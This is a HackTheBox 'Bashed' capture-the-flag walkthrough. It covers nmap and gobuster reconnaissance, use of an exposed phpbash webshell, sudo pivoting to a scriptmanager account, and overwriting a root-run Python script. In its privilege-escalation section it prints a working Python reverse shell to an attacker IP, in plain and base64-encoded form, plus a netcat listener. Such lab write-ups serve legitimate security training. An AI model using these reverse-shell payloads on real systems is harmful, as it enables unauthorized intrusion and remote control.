
Instead of typing IP address every time attach it to dns.

`nano /etc/hosts`

![[HackTheBox/Bashed/images/1.png]]

## Reconnaissance

Conduct `nmap` scans respectively ->

`sudo nmap -p- -Pn --min-rate 10000 bashed.htb`

Full port coverage + skip host discovery to avoid ICMP-based false negatives on firewalled hosts.

![[HackTheBox/Bashed/images/2.png]]

Version scan + default script scan + skip host discovery option

`sudo nmap -p 80 -Pn -sV -sC bashed.htb`

![[HackTheBox/Bashed/images/3.png]]

Observe that there was a page seen through `http-title` & `http-server-header`.

Aggressive scan gave more detailed results.

`sudo nmap -p 80 -Pn -A bashed.htb`

We can get OS detection as well.

![[HackTheBox/Bashed/images/4.png]]

I also conducted NSE `vuln` script scan ,but took too much time to get results ,so I skipped.

![[HackTheBox/Bashed/images/5.png]]

Check various vulnerabilities (sql, directory disclosure, slowloris) found by NSE engine.

![[HackTheBox/Bashed/images/9.png]]

### Fuzzing

Simple `gobuster` session gave me several endpoints.

`gobuster dir -r -u http://bashed.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 40`

![[HackTheBox/Bashed/images/6.png]]

Moreover, page mentioned extraordinary thread about a script called `phpbash` on `http://bashed.htb/index.html`

![[HackTheBox/Bashed/images/7.png]]

He advertises his webshell on `GitHub`. Let's check ->

![[HackTheBox/Bashed/images/8.png]]

on `/dev/` surface there was a demo of our script. I used first one.

![[HackTheBox/Bashed/images/10.png]]

Get `user` flag.

![[HackTheBox/Bashed/images/11.png]]

Observe `webserver` user can run commands as `scriptmanager` with sudo and without giving password.

I tried to switch user to `scriptmanager`

![[HackTheBox/Bashed/images/12.png]]

Plus, run the commands as `scriptmanager` ,yet it blocked me.

```
www-data@bashed
:/var/www/html/dev# sudo -u scriptmanager ls -la /root/

ls: cannot open directory '/root/': Permission denied
```

On root path `/`there is an unusual directory called `scripts`. Let's check

![[HackTheBox/Bashed/images/13.png]]

Also it was not possible to see entire contents of the `/scripts/` path as `www-data`. Therefore, run it as `scriptmanager` user.

![[HackTheBox/Bashed/images/14.png]]

Now it worked successfuly.

`sudo -u scriptmanager ls -al /scripts/`

```
www-data@bashed
:/# sudo -u scriptmanager ls -al /scripts/

total 16
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 .
drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
-rw-r--r-- 1 root root 12 Mar 4 06:57 test.txt
```

I understood that override the python script as `reverse shell` & run it.

```
www-data@bashed
:/# sudo -u scriptmanager cat /scripts/test.txt

testing 123!
www-data@bashed
:/# sudo -u scriptmanager cat /scripts/test.py

f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

if we just put `echo` after scriptmanager we will get permission error just because the pipe we use `>`. It works as `www-data` user's permission.

we have fully supported python environment.

```
www-data@bashed
:/# which python

/usr/bin/python
www-data@bashed
:/# which python3

/usr/bin/python3
www-data@bashed
:/# which python2

/usr/bin/python2
```

`sudo -u scriptmanager bash -c echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.50",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")" > /scripts/test.py`

it did not work I will convert base64 ->

`echo 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.50",8001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' | base64 -w0`

![[HackTheBox/Bashed/images/15.png]]

Run full `root` shell payload as scriptmanager's bash shell echoes the base64 version of the above payload and then decodes via `base64` tool then overwrites to `test.py`

`sudo -u scriptmanager bash -c 'echo aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNTAiLDgwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpCg== | base64 -d > /scripts/test.py'`

Below as you see, `penelope` attempted to upgrade shell to PTY and make ready the session for us.

![[HackTheBox/Bashed/images/16.png]]

However, the shell was fully stuck even it upgrades python session. That is why, move with `netcat`. -> `nc -lvnp 8001`

Its done ! ! !

![[HackTheBox/Bashed/images/17.png]]